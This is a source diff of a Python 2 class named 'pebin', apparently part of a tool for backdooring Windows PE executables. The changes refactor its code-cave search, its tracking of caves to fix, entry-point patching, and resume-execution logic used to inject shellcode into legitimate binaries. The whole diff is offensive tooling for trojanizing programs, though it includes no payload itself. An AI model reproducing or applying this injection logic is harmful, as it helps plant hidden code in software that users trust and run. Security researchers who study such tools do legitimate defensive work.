@@ -682,19 +682,20 @@ class pebin():
         """This function finds all code caves, allowing the user
         to pick the cave for injecting shellcode."""
 
-        len_allshells = ()
+        self.flItms['len_allshells'] = ()
         if self.flItms['cave_jumping'] is True:
             for item in self.flItms['allshells']:
-                len_allshells += (len(item), )
-            len_allshells += (len(self.flItms['resumeExe']), )
-            SIZE_CAVE_TO_FIND = sorted(len_allshells)[0]
+                self.flItms['len_allshells'] += (len(item), )
+            # TODO: ADD Stub len for zeroing memory here
+            self.flItms['len_allshells'] += (len(self.flItms['resumeExe']), )
+            SIZE_CAVE_TO_FIND = sorted(self.flItms['len_allshells'])[0]
         else:
             SIZE_CAVE_TO_FIND = self.flItms['shellcode_length']
-            len_allshells = (self.flItms['shellcode_length'], )
+            self.flItms['len_allshells'] = (self.flItms['shellcode_length'], )
 
         print "[*] Looking for caves that will fit the minimum "\
               "shellcode length of %s" % SIZE_CAVE_TO_FIND
-        print "[*] All caves lengths: ", len_allshells
+        print "[*] All caves lengths: ", self.flItms['len_allshells']
         Tracking = 0
         count = 1
         #BeginCave=0
@@ -777,7 +778,7 @@ class pebin():
 
         CavesPicked = {}
 
-        for k, item in enumerate(len_allshells):
+        for k, item in enumerate(self.flItms['len_allshells']):
             print "[*] Cave {0} length as int: {1}".format(k + 1, item)
             print "[*] Available caves: "
 
@@ -905,6 +906,7 @@ class pebin():
         functions to perform the binary patching.
         """
         print "[*] In the backdoor module"
+        # TODO: Take out Injector
         if self.INJECTOR is False:
             os_name = os.name
             if not os.path.exists("backdoored"):
@@ -925,6 +927,7 @@ class pebin():
         self.flItms['LastCaveAddress'] = 0
         self.flItms['stager'] = False
         self.flItms['supplied_shellcode'] = self.SUPPLIED_SHELLCODE
+        self.flItms['CavesToFix'] = {}
 
         #pulling apis
         if self.check_shells() is False:
@@ -946,9 +949,8 @@ class pebin():
 
         if self.set_shells() is False or self.flItms['allshells'] is False:
             return False
-        
-        #reserve space for shellcode
 
+        #reserve space for shellcode
         targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
         # Finding the length of the resume Exe shellcode
         if self.flItms['Magic'] == int('20B', 16):
@@ -961,9 +963,12 @@ class pebin():
         self.flItms['shellcode_length'] = shellcode_length + len(self.flItms['resumeExe'])
 
         caves_set = False
+
+        # This can be improved. TODO: add parsed caves to a tracking dict
+        #  for "single": [caves] and "jump": [caves] for that parsing
+        #  does not have to happen over and over again.
+        #  Also think about removing None from the equation?
         while caves_set is False and self.flItms['NewCodeCave'] is False:
-            #if self.flItms['NewCodeCave'] is False:
-                #self.flItms['JMPtoCodeAddress'], self.flItms['CodeCaveLOC'] = (
             self.flItms['CavesPicked'] = self.find_cave()
             if type(self.flItms['CavesPicked']) == str:
                 if self.flItms['CavesPicked'].lower() in ['append', 'a']:
@@ -1001,6 +1006,11 @@ class pebin():
             #else:
             #    caves_set = True
 
+        # Assigning code caves to fix
+        if self.flItms['CavesPicked'] != {}:
+            for cave, values in self.flItms['CavesPicked'].iteritems():
+                self.flItms['CavesToFix'][cave] = [values[6] + 5 + self.flItms['AddressOfEntryPoint'], self.flItms['len_allshells'][cave]]
+
         #If no cave found, continue to create one.
         if self.flItms['JMPtoCodeAddress'] is None or self.flItms['NewCodeCave'] is True:
             self.create_code_cave()
@@ -1013,11 +1023,13 @@ class pebin():
         targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
         targetFile.patch_initial_instructions()
 
+        # recalling resumeExe
         if self.flItms['Magic'] == int('20B', 16):
             ReturnTrackingAddress, self.flItms['resumeExe'] = targetFile.resume_execution_64()
         else:
             ReturnTrackingAddress, self.flItms['resumeExe'] = targetFile.resume_execution_32()
 
+        # setting the final shellcode
         self.set_shells()
 
         if self.flItms['cave_jumping'] is True:
@@ -1029,7 +1041,6 @@ class pebin():
                     temp_jmp += struct.pack("<I", 0xffffffff - abs(breakupvar - len(self.flItms['allshells'][1]) - 4))
                 else:
                     temp_jmp += struct.pack("<I", breakupvar - len(self.flItms['allshells'][1]) - 5)
-
             self.flItms['allshells'] += (self.flItms['resumeExe'], )
 
         self.flItms['completeShellcode'] = self.flItms['shellcode'] + self.flItms['resumeExe']
@@ -1126,6 +1137,7 @@ class pebin():
         self.flItms['shellcode'] = self.flItms['shells'].returnshellcode()
         return True
 
+    #  TODO: Take this out and make it a standalone script
     def injector(self):
         """
         The injector module will hunt and injection shellcode into
